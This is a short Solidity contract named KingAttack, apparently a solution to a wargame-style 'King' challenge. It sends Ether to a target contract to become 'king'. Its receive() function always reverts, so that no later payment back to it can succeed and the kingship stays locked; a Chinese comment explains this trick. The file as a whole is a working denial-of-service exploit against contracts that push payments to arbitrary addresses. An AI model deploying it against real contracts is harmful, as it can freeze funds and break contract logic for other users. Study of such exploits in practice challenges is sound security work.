// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
   address public king;

    constructor(address _king) payable  {
      king = _king;

    }
    function attack(uint256 amount) public {
      require(address(this).balance >= amount, "Not enough");  
      (bool success,) = king.call{value: amount}("");
      require(success, "attack failed");
    }

    receive() external payable { 
      // 重点在这，主动报错,整个交易回滚，你还是原来的国王
      revert("I am King forever");
    }

}